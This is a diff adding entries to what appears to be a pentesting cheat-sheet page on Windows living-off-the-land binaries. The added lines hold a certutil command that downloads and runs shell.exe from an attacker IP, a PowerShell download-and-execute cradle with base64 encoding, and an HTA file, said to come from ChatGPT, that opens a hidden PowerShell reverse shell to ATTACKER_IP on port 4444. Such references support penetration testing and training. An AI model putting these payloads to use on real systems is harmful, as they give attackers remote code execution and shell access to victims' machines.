@@ -21,7 +21,16 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
+## short 
+```bash
+certutil -urlcache -f http://10.10.14.82:8000/shell.exe C:\Windows\Temp\shell.exe & C:\Windows\Temp\shell.exe
 
+# powershell reverse shell:
+# /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 --> shell.ps1 ,edit it
+IEX(New-Object Net.WebClient).downloadString("http://<IP>/shell.ps1") #>down.txt
+cat down.txt | iconv -t utf-16le | base64 -w 0   #-> <BASE64 PAYLOAD>
+powershell -enc <BASE64 PAYLOAD>
+```
 ## Lolbas
 
 The page [lolbas-project.github.io](https://lolbas-project.github.io/) is for Windows like [https://gtfobins.github.io/](https://gtfobins.github.io/) is for linux.\
@@ -179,8 +188,21 @@ mshta \\webdavserver\folder\payload.hta
 </html>
 ```
 
+**payload.hta** reverse shell script from chatgpt
 
-
+```html
+<html>
+<head>
+<script language="VBScript">
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'>'; $sb=[Text.Encoding]::ASCII.GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"""
+self.close
+</script>
+</head>
+<body>
+</body>
+</html>
+```
 #### **mshta - sct**
 
 [**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
